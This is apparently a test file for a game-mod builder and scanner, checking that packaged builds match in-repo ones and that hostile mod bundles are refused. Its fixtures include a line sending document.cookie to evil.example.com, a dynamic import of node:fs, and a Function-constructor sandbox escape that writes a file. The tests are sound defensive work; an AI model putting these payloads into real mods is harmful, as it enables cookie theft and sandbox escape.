// The published toolchain, @spup/mod-builder: it is this repo's own builder and scanner, vendored,
// and it has to keep producing exactly what the in-repo tools produce — a third-party mod's package
// is only comparable to a first-party one if both were built by the same code.

import {test} from "node:test";
import assert from "node:assert/strict";
import {execFileSync} from "node:child_process";
import {mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync, symlinkSync, existsSync} from "node:fs";
import {createHash} from "node:crypto";
import {tmpdir} from "node:os";
import {join, resolve} from "node:path";
import {staleFiles} from "../../tools/pack-builder.js";
import {buildMod} from "../../tools/build-mod.js";
import {SDK_VERSION} from "../common/ModManifest.js";

const CLI = resolve("packages/mod-builder/cli.js");
// Built by `npm run pack:server`, so it is absent in a fresh checkout.
const HARNESS = resolve("packages/game-server/dist-harness/harness.js");

/**
 * @param {object} t the test context, for cleanup
 * @returns {string}
 */
function tempDir(t) {
    const dir = mkdtempSync(join(tmpdir(), "pipes-builder-pkg-"));
    t.after(() => rmSync(dir, {recursive: true, force: true}));
    return dir;
}

/**
 * @param {string[]} args
 * @returns {string} stdout
 */
function runCli(args) {
    return execFileSync("node", [CLI, ...args], {encoding: "utf8"});
}

/**
 * @param {string} path
 * @returns {string}
 */
function hashOf(path) {
    return createHash("sha256").update(readFileSync(path)).digest("hex");
}

test("the vendored dist is current", () => {
    // Whoever changes the builder, the scanner, or the manifest model reruns `npm run pack:builder`.
    assert.deepEqual(staleFiles(), []);
});

test("the packaged builder produces exactly what the in-repo one does", async (t) => {
    const dir = tempDir(t);
    const viaPackage = join(dir, "package");
    const inRepo = join(dir, "in-repo");

    runCli(["build", resolve("src/mods/Market"), viaPackage, "--version", "2.0.0"]);
    await buildMod(resolve("src/mods/Market"), inRepo, {version: "2.0.0"});

    for (const file of ["mod.js", "mod.json"]) {
        assert.equal(hashOf(join(viaPackage, file)), hashOf(join(inRepo, file)), file);
    }
});

test("the builder runs from a bare checkout, the way the registry runs it", (t) => {
    const dir = tempDir(t);

    // No --import loader: the registry clones a pinned commit and runs this file directly, so
    // nothing it reaches may depend on this repo's "@/" alias.
    execFileSync("node", [
        resolve("tools/build-mod.js"), resolve("src/mods/BaseGame"), dir, "--version", "2.0.0",
    ], {encoding: "utf8"});

    assert.match(readFileSync(join(dir, "mod.json"), "utf8"), /"name": "base-game"/);
});

test("check passes a real package and runs its factories against a stub SDK", (t) => {
    const dir = tempDir(t);
    runCli(["build", resolve("src/mods/Market"), dir, "--version", "2.0.0"]);

    // Market has a sim part, so passing means both factories ran against stubs without throwing.
    assert.match(runCli(["check", dir]), /all checks passed/);
    assert.match(runCli(["scan", join(dir, "mod.js")]), /clean/);
});

test("check refuses a bundle that reaches past the SDK", (t) => {
    const dir = tempDir(t);
    mkdirSync(dir, {recursive: true});
    writeFileSync(join(dir, "mod.json"), JSON.stringify({
        name: "hostile", version: "1.0.0", sdkVersion: SDK_VERSION, entry: "mod.js", parts: ["declaration"],
    }));
    writeFileSync(join(dir, "mod.js"), `
        export function createDeclaration(sdk) {
            fetch("https://evil.example.com", {body: document.cookie});
            return new sdk.AbstractModDeclaration();
        }
    `);

    assert.throws(() => runCli(["check", dir]), /disallowed globals/);
});

/**
 * A package whose bundle tries to write a marker file from its top level, so a test can tell
 * whether it ever ran.
 * @param {object} t the test context, for cleanup
 * @param {function(string): string} bodyFor the bundle source above the factory, given the marker path
 * @returns {{dir: string, marker: string}}
 */
function markerPackage(t, bodyFor) {
    const dir = tempDir(t);
    const marker = join(dir, "ran.txt");
    writeFileSync(join(dir, "mod.json"), JSON.stringify({
        name: "hostile", version: "1.0.0", sdkVersion: SDK_VERSION, entry: "mod.js", parts: ["declaration"],
    }));
    writeFileSync(join(dir, "mod.js"), `${bodyFor(marker)}
        export function createDeclaration(sdk) { return new sdk.AbstractModDeclaration(); }
    `);
    return {dir, marker};
}

test("the scan sees dynamic import, which leaves no free name behind", (t) => {
    const {dir} = markerPackage(t, () => `
        const where = "node:fs";
        const fs = await import(where);
    `);

    assert.throws(() => runCli(["scan", join(dir, "mod.js")]), /import\(\)/);
});

test("check never evaluates a bundle that failed the scan", (t) => {
    const {dir, marker} = markerPackage(t, path => `
        fetch("https://evil.example.com");
        const fs = await import("node:fs");
        fs.writeFileSync(${JSON.stringify(path)}, "ran");
    `);

    assert.throws(() => runCli(["check", dir]), /disallowed globals/);
    assert.equal(existsSync(marker), false);
});

// `[].constructor.constructor` is the Function constructor with no free name anywhere, so no scan
// can see it. What stops it is the process the factories run in, not the lint.
test("check contains a bundle the scan cannot see through", (t) => {
    const {dir, marker} = markerPackage(t, path => `
        const F = [].constructor.constructor;
        const proc = F("return process")();
        proc.getBuiltinModule("node:fs").writeFileSync(${JSON.stringify(path)}, "ran");
    `);

    // The scan passes it; the sandbox does not.
    assert.match(runCli(["scan", join(dir, "mod.js")]), /clean/);
    assert.throws(() => runCli(["check", dir]), /Access to this API has been restricted/);
    assert.equal(existsSync(marker), false);
});

test("a mod's own spec runs against the real engine, with no game checkout", (t) => {
    if (!existsSync(HARNESS)) {
        t.skip("packages/game-server is not staged; run `npm run pack:server`");
        return;
    }
    const dir = tempDir(t);
    // The author's own install, as npm would lay it out: the package resolves by name from the mod.
    mkdirSync(join(dir, "node_modules/@spup"), {recursive: true});
    symlinkSync(resolve("packages/game-server"), join(dir, "node_modules/@spup/game-server"), "dir");
    writeFileSync(join(dir, "declaration.js"), `
        import {AbstractModDeclaration, ObjectType, PlacementRule, GeneratorBehavior, PortDefinition, Direction} from "@spup/sdk";
        export const WidgetType = new ObjectType({
            name: "Widget",
            toolId: 1,
            outputPorts: [new PortDefinition("out", {x: 0, y: -1, direction: Direction.UP})],
            geometry: "1x1",
            textureName: "demo-machine/0",
            label: "Widget",
            placement: new PlacementRule({replaceSameKind: true}),
            behavior: new GeneratorBehavior({processingTicks: 1, output: 900}),
        });
        export class Declaration extends AbstractModDeclaration {
            get name() { return "Fixture"; }
            get objectTypes() { return [WidgetType]; }
        }
    `);
    writeFileSync(join(dir, "widget.spec.js"), `
        import {test} from "node:test";
        import assert from "node:assert/strict";
        import {makeGameEngine, ModPackage, CreateObjectMessage, Direction} from "@spup/game-server/test";
        import {Declaration, WidgetType} from "./declaration.js";
        test("the widget produces into its output port", async () => {
            const engine = await makeGameEngine([new ModPackage(new Declaration())]);
            engine.applyMessage(new CreateObjectMessage(WidgetType.typeId, 5, 5, Direction.UP));
            const [eid] = engine.placed.eidsOf(WidgetType.typeId);
            const def = engine.components.get("Generator");
            const out = def.store.out[def.row(eid)];
            for (let tick = 0; tick < 5; tick += 1) {
                engine.tickAll();
            }
            assert.equal(engine.portItem(out), 900);
        });
    `);

    // node's test runner refuses to run files when it detects it is already inside one, so the
    // child has to be told it is on its own.
    const env = {...process.env};
    delete env.NODE_TEST_CONTEXT;
    const output = execFileSync("node", [
        "--import", resolve("packages/game-server/testLoader.js"),
        "--test", join(dir, "widget.spec.js"),
    ], {encoding: "utf8", env, cwd: dir});

    assert.match(output, /# pass 1/);
    assert.match(output, /# fail 0/);
});

test("check refuses a package whose manifest and bundle disagree", (t) => {
    const dir = tempDir(t);
    mkdirSync(dir, {recursive: true});
    writeFileSync(join(dir, "mod.json"), JSON.stringify({
        name: "mismatched", version: "1.0.0", sdkVersion: SDK_VERSION, entry: "mod.js", parts: ["declaration", "sim"],
    }));
    writeFileSync(join(dir, "mod.js"), "export function createDeclaration(sdk) { return new sdk.AbstractModDeclaration(); }\n");

    assert.throws(() => runCli(["check", dir]), /declares the sim part/);
});
